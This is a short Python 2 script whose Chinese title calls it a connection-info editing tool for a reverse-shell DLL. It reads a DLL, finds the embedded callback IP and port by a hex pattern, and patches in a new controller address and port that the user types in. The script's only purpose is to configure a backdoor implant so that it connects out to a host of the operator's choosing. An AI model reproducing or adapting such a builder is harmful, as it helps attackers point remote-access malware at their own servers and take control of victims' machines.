# -*- coding: cp936 -*-
import re
print "反弹dll 连接信息 修改小工具  by：jonyer"


with open (raw_input("dll :"),'rb+')as f:
    byte=f.read().encode('hex')
    ip1=re.findall("76740000(.*?)0063",byte)
    print ip1[0].decode('hex')



    port=raw_input("port :").encode('hex')
    ip=raw_input("ip :").encode('hex')
   
    while len(port) <8:
        port+="00"
        if len(port) >= 8:
            
            pass
    while len(ip) <30:
        ip+="00"
        if len(ip) >= 30:
            
            pass
   

    
    length=len(ip1[0])-len(port+ip)
    zero=port+"0"*length+ip
    print zero.decode('hex')
    


    kkk=byte.replace(ip1[0],zero)
    f.seek(0)
    f.truncate(0)
    f.write(bytes(kkk.decode('hex')))
    f.close()
    print "OK"
    raw_input('按回车键退出 :')